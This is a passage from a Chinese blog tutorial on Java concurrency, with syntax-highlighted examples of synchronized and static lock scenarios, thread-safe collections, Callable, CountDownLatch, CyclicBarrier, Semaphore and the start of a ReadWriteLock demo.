  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="comment">//两个对象</span></span><br><span class="line">      <span class="type">Phone4</span> <span class="variable">phone1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone4</span>();</span><br><span class="line">      <span class="type">Phone4</span> <span class="variable">phone2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone4</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone1.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(phone2::call, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone4</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 两个静态同步方法 都被synchronized 修饰 是先sendEmail() 还是callPhone()？</span></span><br><span class="line"><span class="comment"> * 答案：sendMsg</span></span><br><span class="line"><span class="comment"> * 解释：只要方法被 static 修饰，锁的就是 Class,这个全局唯一！</span></span><br><span class="line"><span class="comment"> * 所以说这里是同一个锁，并不是因为synchronized 这里程序会从上往下依次执行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone5</span> <span class="variable">phone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone5</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         phone.call();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone5</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景六"><a href="#场景六" class="headerlink" title="场景六"></a>场景六</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 两个静态同步方法 两个不同的phone对象 是先sendEmail() 还是callPhone()？</span></span><br><span class="line"><span class="comment"> * 答案：sendMsg</span></span><br><span class="line"><span class="comment"> * 解释：只要方法被 static 修饰，锁的就是 Class,这个全局唯一！</span></span><br><span class="line"><span class="comment"> * 所以说这里还是同一个锁，不因为是两个不同的phone对象而发生变化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone6</span> <span class="variable">phone1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone6</span>();</span><br><span class="line">      <span class="type">Phone6</span> <span class="variable">phone2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone6</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone1.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         phone2.call();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone6</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景七"><a href="#场景七" class="headerlink" title="场景七"></a>场景七</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个静态同步方法 一个静态普通方法 是先sendEmail() 还是callPhone()？</span></span><br><span class="line"><span class="comment"> * 答案：call</span></span><br><span class="line"><span class="comment"> * 解释：被static修饰锁的是class模板, 而synchronized锁的是调用的对象</span></span><br><span class="line"><span class="comment"> * 这里两个锁互不影响，按时间先后执行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test7</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone7</span> <span class="variable">phone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone7</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         phone.call();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone7</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景八"><a href="#场景八" class="headerlink" title="场景八"></a>场景八</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个静态同步方法 一个静态普通方法 两个对象 是先sendEmail() 还是callPhone()？</span></span><br><span class="line"><span class="comment"> * 答案：call</span></span><br><span class="line"><span class="comment"> * 解释：被static修饰的锁的就是整个class模板</span></span><br><span class="line"><span class="comment"> * 这里一个锁的是class模板 一个锁的是调用者 所以两个锁互不影响</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test8</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone8</span> <span class="variable">phone1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone8</span>();</span><br><span class="line">      <span class="type">Phone8</span> <span class="variable">phone2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone8</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone1.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         phone2.call();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone8</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>非静态的，锁的是一个对象（一个手机）；静态的，锁的是一个模板。</p><h1 id="集合类不安全"><a href="#集合类不安全" class="headerlink" title="集合类不安全"></a>集合类不安全</h1><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 并发下，ArrayList不安全的</span></span><br><span class="line"><span class="comment"> * 解决方案：</span></span><br><span class="line"><span class="comment"> * 1、List&lt;String&gt; list = new Vector&lt;&gt;();</span></span><br><span class="line"><span class="comment"> * 2、List&lt;String&gt; list = Collections.synchronizedList(new ArrayList&lt;&gt;());</span></span><br><span class="line"><span class="comment"> * 3、List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;();</span></span><br><span class="line"><span class="comment"> * CopyOnWrite 写入时复制 COW 计算机程序设计领域的一种优化策略</span></span><br><span class="line"><span class="comment"> * 读写分离 在写入的时候 避免覆盖 造成数据问题</span></span><br><span class="line"><span class="comment"> * CopyOnWriteArrayList的add是用lock锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListTest</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//List&lt;String&gt; list = new ArrayList&lt;&gt;();</span></span><br><span class="line">      <span class="comment">//List&lt;String&gt; list = new Vector&lt;&gt;();</span></span><br><span class="line">      <span class="comment">//List&lt;String&gt; list = Collections.synchronizedList(new ArrayList&lt;&gt;());</span></span><br><span class="line">      List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            list.add(UUID.randomUUID().toString().substring(<span class="number">0</span>, <span class="number">5</span>));</span><br><span class="line">            System.out.println(list);</span><br><span class="line">         &#125;, String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CopyOnWriteArraySet"><a href="#CopyOnWriteArraySet" class="headerlink" title="CopyOnWriteArraySet"></a>CopyOnWriteArraySet</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 普通set会ConcurrentModificationException</span></span><br><span class="line"><span class="comment"> * 解决方案：</span></span><br><span class="line"><span class="comment"> * 1、Set&lt;String&gt; set = Collections.synchronizedSet(new HashSet&lt;&gt;());</span></span><br><span class="line"><span class="comment"> * 2、Set&lt;String&gt; set = new CopyOnWriteArraySet&lt;&gt;();</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetTest</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//Set&lt;String&gt; set = new HashSet&lt;&gt;();</span></span><br><span class="line">      <span class="comment">//Set&lt;String&gt; set = Collections.synchronizedSet(new HashSet&lt;&gt;());</span></span><br><span class="line">      Set&lt;String&gt; set = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            set.add(UUID.randomUUID().toString().substring(<span class="number">0</span>, <span class="number">5</span>));</span><br><span class="line">            System.out.println(set);</span><br><span class="line">         &#125;, String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashSet的底层就是HashMap。看源码可看出来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">HashSet</span><span class="params">()</span> &#123;</span><br><span class="line">    map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质就是map key是无法重复的！</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PRESENT是不变的值</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">PRESENT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br></pre></td></tr></table></figure><h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><p>ConcurrentHashMap的实现原理：<a href="https://blog.csdn.net/weixin_43185598/article/details/87938882">ConcurrentHashMap实现原理及源码分析</a></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * new HashMap&lt;&gt;()默认等价于new HashMap&lt;&gt;(16,0.75);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//Map&lt;String, String&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line">      Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            map.put(Thread.currentThread().getName(), UUID.randomUUID().toString().substring(<span class="number">0</span>, <span class="number">5</span>));</span><br><span class="line">            System.out.println(map);</span><br><span class="line">         &#125;,String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Callable"><a href="#Callable" class="headerlink" title="Callable"></a>Callable</h1><ol><li>可以有返回值</li><li>可以抛出异常</li><li>方法不同，run()&#x2F;call()</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallableTest</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">      <span class="type">FutureTask</span> <span class="variable">futureTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FutureTask</span>(<span class="keyword">new</span> <span class="title class_">MyThread</span>());</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask).start();</span><br><span class="line">      <span class="type">String</span> <span class="variable">S</span> <span class="operator">=</span> (String) futureTask.get();</span><br><span class="line">      System.out.println(S);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt; &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;fsdfsdfs&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>futureTask.get()</code>方法可能产生阻塞，或者使用异步通信来处理。</p><p>细节：</p><ol><li>第二次再调用FutureTask对象所持有的线程会直接结束对应线程，直接调用结果。</li><li>结果可能需要等待，会阻塞。</li></ol><h1 id="常用的辅助类（必会）"><a href="#常用的辅助类（必会）" class="headerlink" title="常用的辅助类（必会）"></a>常用的辅助类（必会）</h1><h2 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h2><p><code>countDownLatch.countDown();</code>&#x2F;&#x2F;数量减一</p><p><code>countDownLatch.await();</code>&#x2F;&#x2F;等待计数器归零，然后再想下执行</p><p>每次有线程调用countDown()，计数器就会减一，假设计数器为0，countDownLatch.await()就会被唤醒。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountDownLatchDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">6</span>);<span class="comment">//总数是6</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName());</span><br><span class="line">            countDownLatch.countDown();<span class="comment">//数量减一</span></span><br><span class="line">         &#125;, String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">      countDownLatch.await();<span class="comment">//等待计数器归零，然后再想下执行</span></span><br><span class="line">      System.out.println(<span class="string">&quot;结束&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/countDown.JPG"></p><h2 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">CyclicBarrier</span> <span class="variable">cyclicBarrier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">7</span>, () -&gt; &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;结束&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=<span class="number">7</span>; i++) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--&gt;&quot;</span>+temp);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               cyclicBarrier.await();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加法计数器，一个线程组的线程需要等待所有线程完成任务后再继续执行下一次任务。所有线程会等待全部线程到达栅栏之后才会继续执行，并且最后到达的线程会完成 Runnable 的任务。</p><p><img src="https://img.lfalive.top/Learn-java-JUC/cyclicBarrier.JPG"></p><h2 id="CyclicBarrier-与-CountDownLatch-区别"><a href="#CyclicBarrier-与-CountDownLatch-区别" class="headerlink" title="CyclicBarrier 与 CountDownLatch 区别"></a>CyclicBarrier 与 CountDownLatch 区别</h2><ul><li>CountDownLatch 是一次性的，CyclicBarrier 是可循环利用的</li><li>CountDownLatch 参与的线程的职责是不一样的，有的在倒计时，有的在等待倒计时结束。CyclicBarrier 参与的线程职责是一样的。</li></ul><h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>Semaphore：信号量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SemaphoreDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//允许的线程数量</span></span><br><span class="line">      <span class="type">Semaphore</span> <span class="variable">semaphore</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">3</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               semaphore.acquire();<span class="comment">//acquire 得到</span></span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot;in&quot;</span>);</span><br><span class="line">               TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot;out&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">               semaphore.release();<span class="comment">//release 释放</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         &#125;, String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><p><code>semaphore.acquire();</code>获得，如果已经满了，就等待有空位被释放出来为止。</p><p><code>semaphore.release();</code>释放，将当前的信号量释放+1，然后唤醒等待的线程。</p><p>作用：多个共享资源互斥的使用；并发限流，控制最大线程数。</p><p><img src="https://img.lfalive.top/Learn-java-JUC/Semaphore.JPG"></p><h1 id="读写锁ReadWriteLock"><a href="#读写锁ReadWriteLock" class="headerlink" title="读写锁ReadWriteLock"></a>读写锁ReadWriteLock</h1><p>读可以被多线程同时读，写的时候只能有一个线程写。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">MyCache</span> <span class="variable">myCache</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyCache</span>();</span><br><span class="line">      <span class="comment">//写入</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">finalI</span> <span class="operator">=</span> i;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; myCache.put(finalI + <span class="string">&quot;&quot;</span>, finalI + <span class="string">&quot;&quot;</span>), String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//读取</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">finalI</span> <span class="operator">=</span> 